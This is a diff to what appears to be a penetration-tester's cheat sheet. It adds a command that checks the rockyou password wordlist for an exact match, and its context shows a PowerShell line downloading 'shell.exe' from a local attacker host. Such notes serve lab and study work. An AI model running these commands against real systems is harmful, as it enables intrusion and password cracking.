@@ -295,6 +295,8 @@ Book extracts:
 
 	Download file with powershell	-> powershell wget “http://192.168.28.31:8000/shell.exe” -outfile “shell.exe” 
 
+	Show line in rockyou for exact match -> zcat /usr/share/wordlists/rockyou.txt.gz | grep -x "Password1" -n
+
 	
 
 Notes:
